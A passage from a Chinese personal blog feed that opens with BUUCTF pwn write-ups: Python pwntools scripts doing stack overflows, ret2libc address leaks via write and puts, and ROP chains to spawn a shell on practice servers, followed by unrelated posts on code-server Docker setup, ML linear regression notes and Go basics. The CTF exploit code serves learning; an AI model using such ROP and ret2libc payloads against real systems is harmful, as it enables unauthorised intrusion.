class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>看似没有什么问题吧，但是放到buu上面一跑</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timeout: the monitored command dumped core<br></code></pre></td></tr></table></figure><p>检查多遍未果，又和师傅们交流也没下文，后来有个师傅自己写了一遍跑通了，遂检查不同之处，发现师傅的system_addr是手写的，于是自己也去找到<code>_system</code>填入地址，写成新的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span><br><br><span class="hljs-comment">#p=process(&#x27;./ciscn_2019_ne_5&#x27;)</span><br>e=ELF(<span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27192</span>)<br><br><span class="hljs-comment">#binsh_addr=0x080482EA</span><br>ret_addr=<span class="hljs-number">0x0804843e</span><br>popebp_ret_addr=<span class="hljs-number">0x08048720</span><br>binsh_addr=<span class="hljs-number">0x080482ea</span><br><span class="hljs-comment">#system_addr=e.symbols[&#x27;system&#x27;]</span><br>system_addr=<span class="hljs-number">0x80484d0</span><br><br>p.sendlineafter(<span class="hljs-string">&#x27;word:&#x27;</span>, <span class="hljs-string">&#x27;administrator&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span> + <span class="hljs-number">0x4</span>) + p32(system_addr) + p32(binsh_addr) + p32(binsh_addr)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>通了…后来又仔细看了一下使用symbols输出的地址为<code>0x804a024</code>，回去一看读的是plt-got段的system地址…真是害人不浅啊</p><h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>checksec看到保护全关，进IDA分析就是很简单的一串逻辑，在第二个函数处看到了明显的溢出，但是题目里面没有直接提供shell相关操作，所以判断本题为ret2libc，题目中给到了write函数，所以考虑使用write函数来泄露</p><p>关于write参数<code>fd</code>我找到了如下解释</p><blockquote><p>write() writes up to count bytes from the buffer starting at buf to the file referred to by the file descriptor fd.</p></blockquote><p>概言之，就是<a href="https://stackoverflow.com/questions/29921246/why-fd1-is-write-and-fd0-is-read">0 stands for stdin and 1 stands for stdout</a>，不一定正确，但是有助于记忆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./2018_rop&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./2018_rop&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26830</span>)<br><br>main_addr = <span class="hljs-number">0x080484C6</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(system_addr) + p32(system_addr) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>先checksec，64位小端序，MX保护开，其它全关，接着进入IDA分析</p><p>main函数内很简单，进一步分析后找到关键函数vuln</p><p><img src="https://image.0error.net/img/2022/20221024204049.png"></p><p>本题没有找到backdoor，所以应该是做基地址泄露然后getshell，整个程序内只有puts函数可以输出内容，因此对puts函数进行修改，先溢出后转到此处，考虑到系统会对堆栈进行平衡，所以我们要修改puts的参数需要先进行一次pop保证堆栈平衡，因此使用ROPgadget先找到符合我们条件的ROP</p><blockquote><p>在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。<br>因此需要找到pop rdi，ret的gadget</p></blockquote><blockquote><p>64位的system调用的大坑<br>64位的system调用会判断rsp的值是否%16&#x3D;0；解决方法是在调用system之前使用ret来帮助解决；<br>然而对齐问题解决就行了吗？不存在的，还是会出现问题。因为这个涉及到栈平衡的问题，所以最好的解决办法，是不要把栈平衡问题遗留到system调用的时候，应该在哪里出现就在哪里解决。</p></blockquote><p><img src="https://image.0error.net/img/2022/20221024204414.png"></p><p>puts_got是puts函数的got表项地址，里面装的是puts的真实地址。使用pop_rdi_ret会把puts_got作为参数弹到寄存器rdi上。接着执行puts_plt(puts_got)，就能得到puts真实地址。</p><p>到这里我们就可以构造payload了，大体思路就是保持堆栈平衡，然后利用puts函数泄露其got地址，然后找到其对应的lib，就可以修改令其执行&#x2F;bin&#x2F;sh，从而getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./bjdctf_2020_babyrop&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28430</span>)<br><br>pop_rdi_addr=<span class="hljs-number">0x0000000000400733</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>p.recvuntil(<span class="hljs-string">b&quot;story!\n&quot;</span>)<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span> + <span class="hljs-number">8</span>) + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.sendline(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts addr: &quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span> + <span class="hljs-number">8</span>) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人code-server搭建记录</title>
      <link href="/2021/10/51f81c34.html"/>
      <url>/2021/10/51f81c34.html</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近因为越来越多<del>极其繁琐</del>的专业课，而我的游戏本我实在是背不动了。。。所以想在自己的pad上搭建一个开发环境，一个是解放一下自己的书包，一个是让自己的服务器发挥点作用。。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>Tencent Cloud </p><p>Ubuntu 20.04 LTS</p><p>1H2G+1M</p><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><p>安装docker一类的就不再赘述了,完成上述步骤后，直接安装code-server的docker镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">启动code-server容器</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-p 主机端口:docker端口，-v 主机目录:docker容器中目录</span><br>docker run -itd --name my-code -u root -p 80:8080 -v /data/my-code:/home/coder/project -e PASSWORD=123456 codercom/code-server:latest --auth password<br><span class="hljs-meta prompt_">#</span><span class="language-bash">进入容器 -it后面跟着的是容器名称</span><br>docker exec -it my-code /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装coderunner插件后进入容器，通过apt安装各类环境即可使用</span><br>apt-get update<br>apt-get install gcc<br>apt-get install g++<br>apt-get install python<br></code></pre></td></tr></table></figure><p>这里要注意，直接安装环境插件是不适配的，所以需要使用apt去给docker内安装环境</p>]]></content>
      
      
      
        <tags>
            
            <tag> 记录 </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ML - Regression</title>
      <link href="/2021/10/a372485c.html"/>
      <url>/2021/10/a372485c.html</url>
      
        <content type="html"><![CDATA[<h1 id="Regression"><a href="#Regression" class="headerlink" title="Regression"></a>Regression</h1><h2 id="Machine-Learning"><a href="#Machine-Learning" class="headerlink" title="Machine Learning"></a>Machine Learning</h2><p>机器学习的意义就在于<strong>让机器具备找一个函数（function）的能力</strong></p><h2 id="Different-types-of-Functions"><a href="#Different-types-of-Functions" class="headerlink" title="Different types of Functions"></a>Different types of Functions</h2><h3 id="Regression-1"><a href="#Regression-1" class="headerlink" title="Regression"></a>Regression</h3><p>如果要找的函数输出的值是一个数值，即一个标量（scalar），那这样的机器学习就是线性回归的模型（Regression）</p><h3 id="Classification"><a href="#Classification" class="headerlink" title="Classification"></a>Classification</h3><p>Classification主要是要机器做选择题，由人类事先准备好一些选项，类似于黑盒测试的原理，最后只需要机器给出选择这几个选项里面的哪一个即可，常见的如垃圾邮件的判定（YES&#x2F;NO）</p><p>Alpha go本来也是一个分类问题，只是这个分类问题选项比较多，有19x19个选项（棋盘的大小），需要选出下一步应该落子的位置</p><h3 id="Structured-Learning"><a href="#Structured-Learning" class="headerlink" title="Structured Learning"></a>Structured Learning</h3><p>在回归问题与分类问题以外，我们还需要另外一种更复杂的机器学习，要产生一个具有结构的物体，比如需要机器去画一张图，写一篇文章，这种叫机器产生有结构的东西的问题，也就是说机器学习到了这一步，就需要去学习如何去创作一些东西。</p><h2 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h2><p>知道了机器学习就是需要去找一个函数，那我们就需要想想应该如何才能找到这个函数。拿某视频播放平台<del>youtube</del>的视频播放量来说，<strong>我们应该可以找到一个函数，输入我们前几天视频播放量或浏览量的数据，输出某一天这个视频总的观看次数，这里要先能够做到一个函数的大致数据和原数据拟合，再去考虑是否可以预测出未来的播放量。</strong></p><p>而机器学习找到这个函数的过程，应当分为如下三步</p><h3 id="1-Function-with-Unknown-Parameters"><a href="#1-Function-with-Unknown-Parameters" class="headerlink" title="1. Function with Unknown Parameters"></a>1. Function with Unknown Parameters</h3><p>第一步是需要我们<strong>写出一个带有未知参数的的函数</strong>，也就是说要写一个函数F，关于这个函数最初的形式，需要我们自己去进行推测，然后再拿推测的函数去测试，比如在这次，我们先写为如下的形式：<br>$y&#x3D;b+w \ast x_1$  ①</p><ol><li>y是我们准备去预测的value，此时我们准备预测的是今天此频道总的观看次数</li><li>$x_1$是这个频道前一天总的观看次数</li><li>b与w均为未知的参数，这是需要我们在函数中去找出来的，我们目前还不知道w与b应该为多少，只能做到猜测</li></ol><p>在函数①中，b与w是未知的，是<strong>Unknown Parameter</strong>， 称为未知的参数，而这个parameter一般就叫做Model，所以我们常常听到有人说模型Model，这个在机器学习里面就是一个带有未知参数的函数。</p><p>而$x_1$是这个function里面我们已知的，是来自于<del>YouTube</del>后台的资讯，已经知道的某一天总人数是多少，这个叫做feature，而w与b是我们不知道的，是未知参数，在这里也给这俩哥们给个名字，与feature相乘的未知参数w，我们叫他weight，直接相加的叫Bias</p><h3 id="2-Define-Loss-from-Traing-Data"><a href="#2-Define-Loss-from-Traing-Data" class="headerlink" title="2. Define Loss from Traing Data"></a>2. Define Loss from Traing Data</h3><p>第二部是要定义一个叫做loss的东西，它也是一个function，而这个function的输入是model里面的参数，我们的model是函数①，而b与w是未知的，是我们需要去找出来的。而loss这个function的输入就是b和w，输入是model里面的parameter，而这个loss输出的值就代表了<strong>把这一组未知的参数设定为某一个具体的数值的时候，这个数值到底是好还是不好</strong></p><p>而这个loss的计算应当源自于训练资料，在这个问题里面，我们的训练资料是此频道过去的点阅次数。</p><p>我们把2017年1月1日的点阅次数，带入这一个函数里面，我们已经说我们想要知道，b设定为0.5k，w设定为1的时候，这个函数的结果是否优秀，当b设定为0.5k，w设定为1的时候，我们拿来预测的这个函数，是y等于0.5k加一倍的$x_1$，那我们就把$x_1$代为4.8k，看它预测出来的结果是多少，<strong>这时候不管是输入的数据还是输出的数据其实都是我们已知的</strong>，所以这时候可以拿着预测出来的数据和真正的结果比对一下，看看他们的差距有多大。比如在本例中，这个函数预估的结果是5.3k，而真正的结果是4.9k，那这个真实的值叫做<code>label</code>，它是高估点阅人数，因此我们可以计算一下这个差距是多少（即估测的值与真实的值的差距）估测的值用y表示，真实的值用$\hat y$来表示，那就可以计算一下这个差距，计算一下二者之间的差距，得到一个$e_1$，代表估测的值与真实的值之间的差距，<br>我们也可以把y与$\hat y$直接相减，取绝对值，算出来的值为0.4k<br><img src="http://image.0error.net/202202102339147.png" alt="loss示例"></p><p>现在我们并不是只能用1月1号来预测1月2号的值，我们可以用1月2号的值，来预测1月3号的值，如果现在的函数是$y&#x3D;0.5k+x_1$，那么再根据1月2号的点阅次数，再预测1月3号的点阅次数，值变更为了5.4k，以$x_1$代4.9k，乘1再加0.5k等于5.4k，接下来计算这个5.4k，跟真正的答案（label）之间的差距是7.5k，如此看来则是低估了这个频道，在1月3号的时候点阅次数才可以算出$e_2$，这个$e_2$是y与$\hat y$之间的差距，算出来是2.1k，那么用同一个方法，你就可以算出来这三年以来每一天的预测的误差，假设今天的function是$y&#x3D;0.5k+x_1$，那么这三年来的每一天的误差，都可以计算出来，每一天的误差都可以给我们一个e<br><img src="http://image.0error.net/202202102339025.png" alt="误差计算示例"></p><p>接下来要做的就是把每一天的误差都加起来，然后取一个平均值，这个大N代表我们训练资料的个数，就是三年来的训练资料，即365x3，算出一个L(oss)，这是每一笔训练资料的误差，这个e相加以后的结果就是我们的loss</p><p><strong>L越大，代表我们现在这一组参数越不好，L越小越好</strong></p><p><strong>估测的值跟实际的值之间的差距，其实也有不同的计算方法</strong>，在刚刚的例子里面，我们计算的是y与$\hat y$之间的绝对值差距从而得到L，这样得到的loss叫做<code>mean absolute error</code>，简写为MAE，如果你今天的e是用y与$\hat y$相减的平方算出来的，这个叫<code>mean square error</code>，又叫MSE，这两者有着非常微妙的差别。如果选择MAE作为计算误差的方式，那么就是把所有的误差加起来就可以得到Loss，要选择MSE也是同样可以完成这个工作i的。另外，如果y和$\hat y$都是几率分布的话，这个时候可能需要选择Cross-entropy，这个我们之后再学习。</p><h4 id="Error-Surface"><a href="#Error-Surface" class="headerlink" title="Error Surface"></a>Error Surface</h4><p>刚刚所举到的例子都不是真正的例子，以下的数字才是真实的例子，是频道真实的后台数据，现在我们可以动手实践了，我们可以调整不同的w，可以调整不同的b，求取各种w和b组合起来以后，为每一种不同的组合计算其Loss，从而画出如下的一个等高线图：<br><img src="http://image.0error.net/202202102340564.png" alt="Loss等高线图"></p><p>在这个等高线图上面，越偏红色系，代表计算出来的loss越大，就代表这一组w与b越差，如果越偏蓝色，就代表loss越小，也就是说这一组参数就越好，使用最好的一组w和b，放在我们的function和model里面，预测结果就会越精准。<strong>像这样的等高线图，你用不同的参数去计算它的loss，画出来的等高线图，就叫做<code>Error Surface</code>，这是机器学习的第二步</strong></p><h3 id="3-Optimization"><a href="#3-Optimization" class="headerlink" title="3. Optimization"></a>3. Optimization</h3><p>接下来进入机器学习的第三步，我们需要解一个最佳化的问题，也就是说我们要找一个w和b（Unknown Parameter），看具体带入哪一个数值，可以让我们的L的值最小，这个值就是我们所要的w与b，我们称为<code>w*</code>和<code>b*</code>，代表说他们是最好的一组w和b，可以让loss的值最小</p><p>在这里我们用到的Optimization方法，叫做Gradient Descent。为了简化起见，我们先假设我们未知的参数只有一个w，而没有b这个未知的参数。当我们给w带入不同的数值时，我们就会得到不同的loss，这一条曲线就是error surface，此时由于只有一个unknown parameter，所以它的数据是1D（维）的</p><p><img src="http://image.0error.net/202202102340512.png" alt="error surface"></p><p><strong>那么我们应该如何去找一个w。使得loss最小呢</strong></p><ol><li>首先需要随机选取一个初始的点，记为$w_0$，这个初始的点往往就是随机的，只需要随机选定一个点即可。</li><li>接下来就需要计算当w取$w_0$的时候，w这个参数对loss的微分是多少<br>$\partial L&#x2F;\partial w|(w&#x3D;w^0)$，也就是求出在$w_0$这个位置error surface的切线的斜率，也就是上图中蓝色的虚线的斜率，如果这一条虚线的斜率是负的，就说明左边比较高，右边比较低</li><li>如果发现左边比较高，右边比较低的话，我们就把w的值变大，从而使得loss变小，反之亦然</li></ol><p><strong>至于这一移到底要移多远，应当取决于以下两点</strong></p><ol><li>首先要看这个地方的斜率有多大，这个地方斜率大的话，那么步伐就也要大一点，反之亦然。</li><li>除此以外，在斜率之外，还有一个东西会影响步伐的大小，我们用$\eta$来表示，这个$\eta$叫做<code>learning rate</code>(学习速率)，这个是由我们自己设定的，如果偏大，那么每次参数更新的值就会变大，学习会比较快，如果偏小，改变就会比较小，学习的精度就会比较高。</li></ol><p><strong>在机器学习中，需要自己设定的东西，叫做<code>hyperparameters</code></strong></p><p><strong>那么为什么loss可以出现负数呢？</strong></p><p>loss这个函数是自定义的，我们说loss就是估测的值跟正确的值的差值，如果根据之前的定义，它确实不可能是负的，但是loss这个函数是由我们自己定义的，我们可以在运算时给它减掉100，那可能就有负的。总而言之，<strong>因为这个function是你自己决定的,所以它有可能是负的</strong></p><p>继续上面的思路，把$w^0$向右移一步，这个新的位置我们记为$w^1$，这一步的步伐是$\eta$乘上微分的结果，用数学式推导如下：<br>$w^1 \gets w^0 - \eta \frac{\partial L}{\partial w}|(w&#x3D;w^0)$<br>接下来就是反复进行这个操作，不断地移动w的位置，直到最后停下来</p><p><strong>那么什么时候会停下来呢？</strong></p><p>这里面有两种状况:</p><ol><li>第一种状况是你失去耐心了，用行话讲就是微分次数达到你自己的设定的上限了，那么到这儿也就不再更新了，这也是一个hyperparameter，由我们自己决定</li><li>还有另外一种理想状态上的停止，就是当我们不断调整参数，到了某一个$w_n$的时候，算出来的值正好是0，而0乘上learning rate $\eta$还是0，所以参数就不会再移动位置，假设我们是这个理想状况，我们把$w^0$更新到$w^1$，再更新到$w^2$，直到最后更新到$w^t$卡住了，也就是说到这儿算出来的这个微分值是0了，那么参数的位置就不会再更新。</li></ol><p><strong>所以说，Gradient Descent并没有找到真正最好的解</strong></p><p><img src="http://image.0error.net/202202102340199.png" alt="梯度下降"></p><p>如上图中，如果把w设定在最右侧的红点位置，就可以让loss最小，但是按照我们的算法，如果Gradient Descent是从$w^0$开始的，那很有可能走到$w^T$处，训练就结束了</p><p>我们称右侧红点这个**可以让loss最小的地方为<code>global minima</code>**，而$w^T$这个地方叫做<code>local minima</code>，它的左右两边，都比这个地方的loss要高一点，但是它不是整个error surface上面的最低点，这个问题并不影响关键结果，在之后还会有讨论。</p><p>解决了一个参数的例子后，我们再回到最初的问题，我们对于视频播放量预测的模型有两个参数：w和b，那么有两个参数的时候，其实参照一个参数的问题，很容易就可以推导出两个参数应该如何去做。</p><ol><li>我们现在有两个参数， 都给它随机的初始值，也就是$w^0和b^0$</li><li>计算w与loss的微分以及b对loss的微分，计算当$w&#x3D;w^0$, $b&#x3D;b^0$时，对应的微分。<br>$\frac{\partial L}{\partial w}|(w&#x3D;w^0, b&#x3D;b^0)$,<br>$\frac{\partial L}{\partial b}|(w&#x3D;w^0, b&#x3D;b^0)$<br>计算结束以后，我们就可以以此去更新w和b，把$w^0$减掉learning rate，乘上微分的结果得到$w^1$，把$b^0$减掉learning rate，乘上微分的结果得到$b^1$<br>$w^1 \gets w^0 - \eta \frac{\partial L}{\partial w}|(w&#x3D;w^0, b&#x3D;b^0)$,<br>$b^1 \gets b^0 - \eta \frac{\partial L}{\partial b}|(w&#x3D;w^0, b&#x3D;b^0)$</li></ol><h2 id="Conclude"><a href="#Conclude" class="headerlink" title="Conclude"></a>Conclude</h2><p>在这个问题里面，算出一个微分的值，就可以决定新的方向，把w与b更新的方向结合起来，就是一个向量，就是如图所示的红色箭头，就可以从一个位置移动到另一个位置。<br><img src="http://image.0error.net/202202102341429.png" alt="point"></p><p>然后再计算一次，再决定要走什么样的方向，把这个微分的值乘上learning rate，再乘上负号，你就知道红色的箭头指向哪里，从而移动w与b的位置，一直到最后找出一组相对最优的w与b</p><p>这个例子最终使用Gradient Descent计算出真正的数据后，最好的w是0.97，最好的b是0.1k，参考预测与实际的观看人数对比，误差大约在500人左右。</p><h2 id="Linear-Model"><a href="#Linear-Model" class="headerlink" title="Linear Model"></a>Linear Model</h2><p>虽然相对最优的w和b已经找出来了，他们可以让loss小到0.48k，但是这样也并不是一个令人满意的结果，因为上面的步骤合起来叫做训练，训练阶段其实是以我们已经知道的2017到2020年每天的观看此处，所以更多的只是在现有数据上（假装不知道罢了）做的一个分析</p><p>但是我们模型的最终目的是去预测我们不知道的未来的观看次数是多少，所以我们要用拿到的这个函数去预测未来的观看次数去计算误差，如图<br><img src="http://image.0error.net/202202102341548.png" alt="result"></p><p>我们来根据图片分析一下结果：</p><ol><li>横轴代表的是时间。所以0这个点，最左边的点，代表的是2021年1月1号，最右边的点，代表的是2021年2月14号。</li><li>纵轴就是观看的人次。这里用千人作为单位。</li><li>红色的线就是真实的观看人次。</li><li>蓝色的线是机器学习预测的人次。</li></ol><p>我们可以很明显的发现，蓝色的线没有什么神奇的地方，几乎就是红色的线往右平移了一天而已。其中比较有意思的一点是这个模型每隔七天有一个循环，所以说如果我们的模型只参考七天的资料，说不定还会预测的更准，所以我们需要修改一下我们的模型，通常一个模型的修改，往往也来自于你对这个问题的理解，称为Domain Knowledge。</p><p>所以，此时针对我们一开始乱写的<del>（这可不是乱写的啊）</del>$y&#x3D;b+wx_1$得出的结论并没有做的特别好，我们观察模型得到的结论是每七天有一个循环，所以我们可以考虑一个新的模型$y&#x3D;b+ \sum_{j&#x3D;1}^{7}w_jx_j$，x的下表j代表是第几天前，一直考虑到七天以前，这些资料，都乘上不同的weight，加起来，再加上bias，得到新的预测的结果。</p><p>如果这就是我们的model，我们得到的结果中loss的值降低到了0.38k。这里的每一个w和b，都会用gradient descent算出其最佳的值。(这里机器没有直接选用七天前的数据)</p><p><img src="http://image.0error.net/202202102341751.png" alt="result"></p><p>其逻辑就是前一天与要预测的隔天的数值的关系很大，所以$w_1*$就是0.79，前三天是0.12，前六天是0.3，前七天是0.18，所以这些所有最佳的值让model得到的loss可以保持在0.38k上</p><p>除此以外还可以考虑选用28天（一个月）的数据，去预测隔天的观看人数，这样得出来的loss是0.33k，如果考虑56天，loss再好一点，是0.32k。看起来，我们考虑再更多天也无法使其进步了，看来考虑天数这件事，已经到了一个极限。但是这里的模型都是一个x（称为feature）乘上一个weight，再加上一个bias就得到预测的结果，这样的模型都有一个共同的名字，叫做Linear model，下面就会探讨如何把Linear model做得更好。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang学习记录</title>
      <link href="/2021/09/74fdcb9a.html"/>
      <url>/2021/09/74fdcb9a.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-值"><a href="#0x01-值" class="headerlink" title="0x01 值"></a>0x01 值</h2><p>字符串可以通过+连接</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    fmt.Println(<span class="hljs-string">&quot;go&quot;</span> + <span class="hljs-string">&quot;lang&quot;</span>)<br><br>    fmt.Println(<span class="hljs-string">&quot;1+1 =&quot;</span>, <span class="hljs-number">1</span>+<span class="hljs-number">1</span>)<br>    fmt.Println(<span class="hljs-string">&quot;7.0/3.0 =&quot;</span>, <span class="hljs-number">7.0</span>/<span class="hljs-number">3.0</span>)<br><br>    fmt.Println(<span class="hljs-literal">true</span> &amp;&amp; <span class="hljs-literal">false</span>)<br>    fmt.Println(<span class="hljs-literal">true</span> || <span class="hljs-literal">false</span>)<br>    fmt.Println(!<span class="hljs-literal">true</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-变量"><a href="#0x02-变量" class="headerlink" title="0x02 变量"></a>0x02 变量</h2><p>可以使<code>var</code>声明1个或多个变量，也可以一次性声明多个变量，Go可以自动判断其数据类型，声明时如果无初值，则会初始化为零值</p><p>例如<code>var f string = &quot;short&quot;</code>可以写为<code>f := &quot;short&quot;</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 